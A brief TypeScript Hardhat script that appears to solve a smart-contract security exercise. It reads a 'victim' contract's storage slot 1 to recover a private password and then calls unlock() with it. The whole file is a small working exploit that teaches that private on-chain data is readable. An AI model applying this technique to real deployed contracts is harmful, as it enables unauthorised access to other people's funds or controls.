import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  const password = await waffle.provider.getStorageAt(victim.address, 1);
  const [owner] = await ethers.getSigners();
  await victim.connect(owner).unlock(password);
};

export default helper;
